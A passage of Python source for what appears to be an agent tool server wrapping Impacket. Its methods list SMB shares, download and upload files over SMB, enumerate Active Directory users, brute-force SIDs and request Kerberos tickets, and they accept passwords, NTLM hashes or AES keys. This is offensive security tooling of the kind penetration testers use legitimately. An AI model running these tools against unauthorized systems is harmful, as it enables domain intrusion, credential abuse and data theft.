        )

        # Use smbclient with piped stdin commands
        cmd = ["impacket-smbclient"]
        cmd.extend(extra_args)
        cmd.append(target_str)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input=b"shares\nexit\n"),
                timeout=timeout,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")

            shares = self._parse_smb_shares(stdout_str, stderr_str)

            return ToolResult(
                success=True,
                data={
                    "target": target,
                    "shares": shares,
                    "share_count": len(shares),
                },
                raw_output=sanitize_output(stdout_str + stderr_str),
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise ToolError(message=f"SMB share listing timed out after {timeout}s")
        except ToolError:
            raise
        except Exception as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))

    async def smb_get(
        self,
        target: str,
        share: str,
        remote_path: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Download a file from an SMB share."""
        self.logger.info(f"Downloading {share}/{remote_path} from {target}")

        target_str, extra_args = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        # Create temp file for download
        fd, local_path = tempfile.mkstemp(prefix="smb_download_")
        os.close(fd)

        cmd = ["impacket-smbclient"]
        cmd.extend(extra_args)
        cmd.append(target_str)

        # Normalize path separators for smbclient
        smb_path = remote_path.replace("/", "\\")

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            commands = f"use {share}\nget {smb_path} {local_path}\nexit\n"
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input=commands.encode()),
                timeout=timeout,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")

            # Check if file was downloaded
            if os.path.exists(local_path) and os.path.getsize(local_path) > 0:
                with open(local_path, "rb") as f:
                    raw = f.read()
                try:
                    content = raw.decode("utf-8")
                    encoding = "utf-8"
                except UnicodeDecodeError:
                    content = base64.b64encode(raw).decode("ascii")
                    encoding = "base64"
                return ToolResult(
                    success=True,
                    data={
                        "target": target,
                        "share": share,
                        "remote_path": remote_path,
                        "content": content,
                        "encoding": encoding,
                        "size": len(raw),
                    },
                    raw_output=content,
                )
            else:
                return ToolResult(
                    success=False,
                    data={"target": target, "share": share, "remote_path": remote_path},
                    error=f"File download failed or empty",
                    raw_output=sanitize_output(stdout_str + stderr_str),
                )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise ToolError(message=f"SMB download timed out after {timeout}s")
        except ToolError:
            raise
        except Exception as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))
        finally:
            if os.path.exists(local_path):
                os.unlink(local_path)

    async def smb_put(
        self,
        target: str,
        share: str,
        remote_path: str,
        content: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Upload content to an SMB share."""
        self.logger.info(f"Uploading to {share}/{remote_path} on {target}")

        target_str, extra_args = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        # Write content to temp file
        fd, local_path = tempfile.mkstemp(prefix="smb_upload_")
        os.write(fd, content.encode())
        os.close(fd)

        cmd = ["impacket-smbclient"]
        cmd.extend(extra_args)
        cmd.append(target_str)

        smb_path = remote_path.replace("/", "\\")

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            commands = f"use {share}\nput {local_path} {smb_path}\nexit\n"
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input=commands.encode()),
                timeout=timeout,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")
            combined = stdout_str + stderr_str

            # Check for errors
            has_error = "error" in combined.lower() and "STATUS_" in combined
            return ToolResult(
                success=not has_error,
                data={
                    "target": target,
                    "share": share,
                    "remote_path": remote_path,
                    "size": len(content),
                },
                raw_output=sanitize_output(combined),
                error=f"SMB upload may have failed: {combined}" if has_error else None,
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise ToolError(message=f"SMB upload timed out after {timeout}s")
        except ToolError:
            raise
        except Exception as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))
        finally:
            if os.path.exists(local_path):
                os.unlink(local_path)

    # ── Enumeration Methods ──────────────────────────────────────────────

    async def get_ad_users(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        all: bool = False,
        timeout: int = 120,
    ) -> ToolResult:
        """Enumerate AD users via LDAP."""
        self.logger.info(f"Enumerating AD users on {target}")

        identity_str, extra_args = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-GetADUsers"]
        cmd.extend(extra_args)
        if all:
            cmd.append("-all")
        cmd.append(identity_str)

        try:
            result = await self.run_command(cmd, timeout=timeout)
            users = self._parse_ad_users(result.stdout, result.stderr)

            return ToolResult(
                success=result.returncode == 0 or bool(users),
                data={
                    "target": target,
                    "users": users,
                    "user_count": len(users),
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))

    async def lookupsid(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        max_rid: int = 4000,
        timeout: int = 120,
    ) -> ToolResult:
        """SID brute-force domain enumeration."""
        self.logger.info(f"LookupSID on {target} (max RID: {max_rid})")

        target_str, extra_args = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-lookupsid"]
        cmd.extend(extra_args)
        cmd.append(target_str)
        cmd.append(str(max_rid))  # maxRid is a positional argument

        try:
            result = await self.run_command(cmd, timeout=timeout)
            parsed = self._parse_lookupsid_output(result.stdout, result.stderr)

            return ToolResult(
                success=result.returncode == 0 or parsed["total"] > 0,
                data={
                    "target": target,
                    **parsed,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))

    # ── Kerberos Methods ─────────────────────────────────────────────────

    async def get_tgt(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Request a Kerberos TGT and save ccache file."""
        self.logger.info(f"Requesting TGT for {username}@{domain or target}")

        identity_str, extra_args = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-getTGT"]
        cmd.extend(extra_args)
        cmd.append(identity_str)

        try:
            result = await self.run_command(cmd, timeout=timeout)
            combined = result.stdout + result.stderr

            # Find the generated ccache file
            ccache_path = None
            ccache_match = re.search(r"Saving ticket in (\S+\.ccache)", combined)
            if ccache_match:
                ccache_path = ccache_match.group(1)

            # Read ccache info
            ccache_exists = ccache_path and os.path.exists(ccache_path)

            return ToolResult(
                success=result.returncode == 0 or ccache_exists,
                data={
                    "target": target,
                    "username": username,
                    "domain": domain,
                    "ccache_file": ccache_path,
                    "ccache_exists": ccache_exists,
                    "hint": f"Set KRB5CCNAME={ccache_path} to use this ticket" if ccache_path else None,
                },
                raw_output=sanitize_output(combined),
            )
        except ToolError as e:
            return ToolResult(success=False, data={"target": target}, error=str(e))


if __name__ == "__main__":
    ImpacketServer.main()
